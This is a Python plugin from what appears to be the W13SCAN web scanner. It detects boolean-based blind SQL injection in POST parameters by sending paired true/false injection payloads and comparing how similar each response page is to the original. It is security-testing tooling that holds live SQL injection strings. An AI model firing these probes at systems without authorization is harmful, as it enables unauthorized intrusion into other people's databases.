#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/7 2:37 PM
# @Author  : w8ay
# @File    : post_sql_inject_bool.py

import copy

import requests

from W13SCAN.lib.common import random_str
from W13SCAN.lib.const import ignoreParams, POST_HINT, Level
from W13SCAN.lib.helper.diifpage import GetRatio
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'POST插件 基于布尔判断的SQL注入'
    desc = '''目前支持POST方式的请求'''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        post_hint = self.requests.post_hint
        post_data = self.requests.post_data

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if method == 'POST':
            if post_hint == POST_HINT.NORMAL:
                sql_flag = [
                    "/**/and'{0}'='{1}'",
                    "'and'{0}'='{1}",
                    '"and"{0}"="{1}',
                ]
                for k, v in post_data.items():
                    if k.lower() in ignoreParams:
                        continue
                    data = copy.deepcopy(post_data)
                    for flag in sql_flag:
                        # true page
                        rand_str = random_str(2)
                        payload1 = v + flag.format(rand_str, rand_str)
                        data[k] = payload1
                        r = requests.post(url, data=data, headers=headers)
                        html1 = r.text
                        radio = GetRatio(resp_str, html1)
                        if radio < 0.88:
                            continue

                        # false page
                        payload2 = v + flag.format(random_str(2), random_str(2))
                        data[k] = payload2
                        r2 = requests.post(url, data=data, headers=headers)
                        html2 = r2.text
                        radio2 = GetRatio(resp_str, html2)
                        if radio2 < 0.78:
                            condition = [
                                '{k}:{v} 与原页面 {k}:{v1} 的相似度{radio} 页面大小:{size1}'.format(k=k, v=payload1, v1=v,
                                                                                        radio=radio,
                                                                                        size1=len(html1)),
                                '{k}:{v} 与原页面 {k}:{v1} 的相似度{radio} 页面大小:{size2}'.format(k=k, v=payload2, v1=v,
                                                                                        radio=radio2,
                                                                                        size2=len(html2))
                            ]
                            # out.log(msg)
                            out.success(url, self.name, payload=k, condition=condition, data=str(data),
                                        raw=[r.raw, r2.raw])
                            break
